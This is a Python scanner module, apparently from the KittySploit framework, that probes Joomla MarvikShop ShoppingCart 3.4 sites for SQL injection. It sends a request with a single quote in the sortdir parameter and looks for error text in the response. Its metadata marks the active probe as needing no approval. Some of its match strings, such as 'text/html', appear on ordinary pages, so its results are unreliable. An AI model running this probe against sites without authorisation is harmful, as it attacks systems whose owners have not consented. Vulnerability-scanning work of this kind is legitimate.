#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Joomla MarvikShop ShoppingCart 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla MarvikShop ShoppingCart 3.4 - Sql Injection Detection',
        'description': 'Joomla MarvikShop ShoppingCart 3.4 is vulnerable to SQL injection which is a code injection technique that might destroy your database. SQL injection is one of the most common web hacking techniques. SQL injection is the placement of malicious code in SQL statements, via web page input.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'joomla', 'marvikshop', 'sqli', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://vulners.com/zdt/1337DAY-ID-38020',
            'https://cxsecurity.com/issue/WLB-2022100015',
            'https://extensions.joomla.org/',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?option=com_oscommerce&osMod=mshop_pl_src&manufacturers_id=7&sort=products_sort_order&page=index.php&format=xml&task=showproducts&view=med&sort=latest&sortdir=%27', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('You have an error in your SQL syntax', 'manufacturers_id', 'products_price', 'text/html',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="Joomla MarvikShop ShoppingCart 3.4 - Sql Injection detected",
                path='/index.php?option=com_oscommerce&osMod=mshop_pl_src&manufacturers_id=7&sort=products_sort_order&page=index.php&format=xml&task=showproducts&view=med&sort=latest&sortdir=%27',
            )
            return True
        return False

